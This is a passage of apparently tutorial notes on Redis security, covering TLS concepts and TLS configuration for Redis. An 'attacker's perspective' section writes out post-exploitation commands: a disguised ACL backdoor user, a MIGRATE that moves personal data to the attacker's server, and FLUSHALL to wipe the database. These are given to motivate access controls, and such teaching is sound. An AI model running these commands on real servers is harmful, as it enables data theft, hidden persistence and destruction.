zj0EAwMDaAAwZQIwKuOOLjmwGgtjG6SASF4W2e8KtQZANRsYXMXJDGwBCi9fM7Qy
S9dvlFLwrcDg1gxlAjEA5XwJikbpk/qyQerzeUspuZKhqh1KPuj2uBdp8vicuBxu
TJUd1W+d3LmikOUgGzil
-----END CERTIFICATE-----
subject=/C=US/ST=California/L=San Francisco/O=Wikimedia Foundation, Inc./CN=*.wikipedia.org
issuer=/C=US/O=DigiCert Inc/CN=DigiCert TLS Hybrid ECC SHA384 2020 CA1
---
No client certificate CA names sent
Peer signing digest: SHA256
Server Temp Key: X25519, 253 bits
---
SSL handshake has read 3554 bytes and written 373 bytes
Verification error: unable to get local issuer certificate
---
New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384
Server public key is 256 bit
Secure Renegotiation IS NOT supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID:
    Session-ID-ctx:
    Resumption PSK: 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    Start Time: 1718938835
    Timeout   : 7200 (sec)
    Verify return code: 20 (unable to get local issuer certificate)
    Extended master secret: no
    Max Early Data: 0
---
```

Under SSL-Session/Cipher, you'll see a series of acronyms (ECDHE-ECDSA-AES256-GCM-SHA384). This is the **cipher suite**, and again, what's specified here are the algorithms used in the asymmetric key and symmetric key ciphers, digital signature algorithms, and message authentication codes for this TLS session. 

![alt cipher](img/cipher.JPG)

#### TLS Versions
Another thing you'll notice here is the TLS version. In the sample output, you can see what we're connected using TLS version 1.2. The TLS version is also negotiated when we make a TLS connection.

TLS 1.0 and TLS 1.1 are legacy and generally not used.

TLS 1.2 is the most widely used of the TLS protocols, and TLS 1.3 is the current modern standard.

TLS 1.3 improves upon TLS 1.2 in a couple of ways: First, it's slightly faster initially because it requires fewer network round trips when negotiating the connection.

Second, TLS 1.3 requires more sophisticated cipher suites that TLS 1.2.

So by now you should know the different building blocks of TLS. Obviously, we've just scratched the surface here. But if you've managed to grasp these basic ideas, then you'll be in a much better position to understand what you're doing when you configure TLS for Redis. That's exactly what we'll be doing in the next unit.


### VI. [Encrypting Connections](https://youtu.be/5zO-DKDtG3Q)
It's finally time to secure Redis with TLS.
In this unit, we'll configure a Redis server process for TLS.
And we'll connect over TLS using the Redis CLI.
In the next unit, we'll look at some additional TLS
settings, including mutual authentication.
For TLS to work, we'll need to build Redis
with encryption enabled.
To do this, set the BUILD_TLS environment
variable when you compile Redis, like you see here on screen.
Now, we have Redis binaries with TLS enabled.
To establish encryption, we need to create three files--
the server certificate, which is the file containing
the server's public key, which has been signed
by a certificate authority, the issuing certificate, that is,
the certificate used to sign the server's public key,
and finally, the server's private key.
In a production environment, the issuing certificate
will usually be provided by whichever certificate
authority you use.
For example, it's common in many enterprises
to operate an internal certificate authority
to issue certificates.
But for the purpose of this demo,
we'll create our own issuing certificate.
So we'll effectively be acting like our own certificate
authority.
Let's use the openssl utility to create these files.
openssl is pretty complex.
So I'm just going to give a high-level description
of the commands you need to run here.
For all the details, check out the handout and the openssl
docs.
First, we'll create the issuing certificate's private key.
If you run this openssl command,
you'll get a file called ca.key, which contains the private key.
Then we'll use that private key to create
the issuing certificate itself.
So when we run this command, we provide
the ca.key file to create the issuing certificate, which
is stored in the ca.crt file.
Now that we have the issuing certificate,
we'll create our server certificate.
The first step is creating a private key for the server.
That's stored in the file redis.key.
Then, we use this private key and the issuing certificate
we just created to create the server certificate.
So the server certificate is now in the file redis.crt.
Let's move these files to some standard directories.
We'll store our issuing certificate
in /usr/local/share/ca-certificates.
We'll store our private keys in /etc/ssl/private.
And finally, we'll store the server certificate in /etc/ssl.
On Ubuntu, you can tell the system about new certificates
by running update-ca-certificates, which
I'm doing here.
We'll also need to set the correct permissions
on these files.
Private keys should be restricted to the owner
with permissions 400.
The public keys ending in .crt should have permissions 644.
Now we have the files we need to set up Redis with TLS.
So to begin, let's open up our redis.conf configuration file.
First, we set the port value to 0.
This is how we disable unencrypted clear text
connections to Redis.
This is an important step.
Next, we set the TLS port to 6379.
This means that Redis will require
TLS when clients connect to it on the standard port.
Now, we'll specify the server certificate
file, which is redis.crt.
And we also specify the server's private key file,
which is redis.key.
We also need to provide the issuing certificate
authority files that this Redis server will trust.
This is important for client authentication later on.
We'll provide the file ca.crt from
/usr/local/share/ca-certificates.
It's also possible to specify a directory of trusted issuing
certificates, or root certificates.
And you can see an example of that in the GitHub repo
for this course.
Now we're also going to disable client authentication for now.
We'll see how to use client authentication
in the next unit.
Let's also specify a few reasonable TLS defaults.
First, we'll specify that we only support TLS versions
1.2 and 1.3.
We'll also specify some allowed cipher suites.
The tls-ciphers directive determines which cipher suites
can be used when a client requests a TLS v1.2 connection.
Similarly, the tls-ciphersuites directive determines which
cipher suites are allowed for v1.3 connections.
And finally, we;ll set tls-prefer-server-ciphers to no
to indicate that the server should allow clients to choose
the cipher suite for TLS connections.
We can now start Redis so that it uses TLS.
So first, we'll start a Redis server process
and point it to the redis.conf we were just editing.
Next, let's try connecting to the server using Redis CLI.
And notice that the connection gets closed right away.
If we look at the Redis log file, we'll see an SSL error.
We actually need to tell the client
that we're connecting over TLS.
So here I am providing the --tls option.
And I'm also providing a certificate authority file.
In this case, this is the certificate that
issued the server's public key.
This is effectively telling the client
that the server's certificate should be signed
by this issuing certificate.
Now when we connect, we can run commands.
And we know that our connection is encrypted.
So that's the basics of setting up encryption in Redis.
in the next unit, we'll see how to enable
TLS for Redis clusters, how to set up client authentication,
and how to tweak some advanced TLS parameters.

- [OpenSSL Command Line Utilities](https://wiki.openssl.org/index.php/Command_Line_Utilities)

- [TLS Support in Redis 6 at redis.io](https://redis.io/topics/encryption)


### VII. [An Attacker's Perspective](https://youtu.be/NmPv15JJm5Y)
At this point, I'm sure you understand that the majority of Redis exploits are caused by administrators exposing Redis directly to the internet and by not enabling authentication. After all, you've heard our horror stories. 

ACLs are important because they limit attack surface. But to limit attack surface, you need to understand a few post-exploitation techniques. Post-exploitation is what happens when an attacker has gained access to a system. This should get you thinking about exactly what you need to protect against. To do that, let's look at an attacker's perspective. Here's how I'd attack Redis if I were an attacker. 

First, I'd run the `SCAN` command to get a general sense of which keys exist.
If I were a less-adept attacker, I might run the `KEYS` command, which returns every key on the Redis server. The problem with this command is that it might raise alarms. The `KEYS` command blocks until it completes. For this reason, KEYS is considered a dangerous command, so don't ever run it in production yourself. 

I might also run the `MONITOR` command -- another dangerous command. The `MONITOR` command streams every command sent to Redis back to your client. This would allow me to see in real time exactly what's sent to the server. Once I had some key names, I'd run the `TYPE` command. This would show me what commands I could run against the keys that I had access to. For instance, here I have a hash. So I can use the `HGETALL` command to see what's inside. 
```
TYPE secret:users:1
HGETALL secret:users:1
```

Look at all the sensitive data. I've just found someone's personal information. I've hit the jackpot. Before leaving though, I need to add one more thing -- a backdoor user using the ACL `SETUSER` command. 
```
ACL SETUSER applicationuser on >password +@all ~* 
```

This would allow me to log back in later and continue my work. In this case, I've named the user *applicationuser* and given this user all permissions. I'll even persist it to your ACL configuration file. This ambiguous naming might get past any cursory check of the currently allowed users. So this incidentally shows why it's important to regularly review the accounts in your database. This is the approach often used by a *low-and-slow* type of attacker. These attackers are the most dangerous because they're hard to detect. 

Another type of attacker is the destructive one. As a destructive attacker, I do two things. If I thought your data was valuable, I'd use the `MIGRATE` command to send the data to my own Redis server. `MIGRATE` moves the entire key and removes it from its origin database. 
```
MIGRATE remoreredisserver.redis.cloud 7700 "" 0 5000 KEYS secret:users:1 
```

Here, I'm migrating the key secret:users:1 to my own server. I can save these details for a later targeted attack using this user's personal information. 

Now on the other hand, if the data on the system was not valuable to me, I'd just drop the database using the `FLUSHALL` command. Now if I run `KEYS`, the database no longer exists. Pretty scary, huh? That's why access controls like ACLs are so important. You can help stop the bad guys from getting in, and you can stop them from stealing data or destroying your database.

|  |  |  |
| ----------- | ----------- | ----------- |
| [SCAN command](https://redis.io/commands/scan) | [KEYS command](https://redis.io/commands/keys) | [TYPE command](https://redis.io/commands/type) |
| [MONITOR command](https://redis.io/docs/latest/commands/monitor/) | [HGETALL command](https://redis.io/commands/hgetall) | [MIGRATE command](https://redis.io/commands/migrate) |
| [FLUSHALL command](https://redis.io/commands/flushall) | [ACL commands](https://redis.io/docs/latest/commands/?name=ACL) | [ACL GENPASS](https://redis.io/docs/latest/commands/acl-genpass/) |
| [ACL USERS](https://redis.io/docs/latest/commands/acl-users/) | [ACL GETUSER](https://redis.io/docs/latest/commands/acl-getuser/) | [ACL DRYRUN](https://redis.io/docs/latest/commands/acl-dryrun/) |


### VIII. Biblipgraphy 
1. [WinShark](https://www.wireshark.org/#homeMemberLink)
2. [Npcap](https://npcap.com/)
3. [Hexdump for Windows](https://www.di-mgt.com.au/hexdump-for-windows.html#downloads)
4. [Laragon](https://laragon.org/)
5. [Man-in-the-Middle (MITM) Attack: Definition, Examples & More](https://www.strongdm.com/blog/man-in-the-middle-attack)
6. [Redis configuration file example](https://redis.io/docs/latest/operate/oss_and_stack/management/config-file/)
7. [The Gold-Bug by  Edgar Allan Poe](https://poemuseum.org/the-gold-bug/)


### Epilogue 
```
5 3 ‡ ‡ † 3 0 5 ) ) 6 * ; 4 8 2 6 ) 4 ‡ . ) 4 ‡ ) ; 8 0 6 * ; 4 8 † 8 ¶ 6 0
) ) 8 5 ; 1 ‡ ( ; : ‡ * 8 † 8 3 ( 8 8 ) 5 * † ; 4 6 ( ; 8 8 * 9 6 * ? ; 8 ) *
‡ ( ; 4 8 5 ) ; 5 * † 2 : * ‡ ( ; 4 9 5 6 * 2 ( 5 * — 4 ) 8 ¶ 8 * ; 4 0 6
9 2 8 5 ) ; ) 6 † 8 ) 4 ‡ ‡ ; 1 ( ‡ 9 ; 4 8 0 8 1 ; 8 : 8 ‡ 1 ; 4 8 † 8 5 ;
4 ) 4 8 5 † 5 2 8 8 0 6 * 8 1 ( ‡ 9 ; 4 8 ; ( 8 8 ; 4 ( ‡ ? 3 4 ; 4 8 ) 4 ‡
; 1 6 1 ; : 1 8 8 ; ‡ ? ;
```


### EOF (2024/06/21)
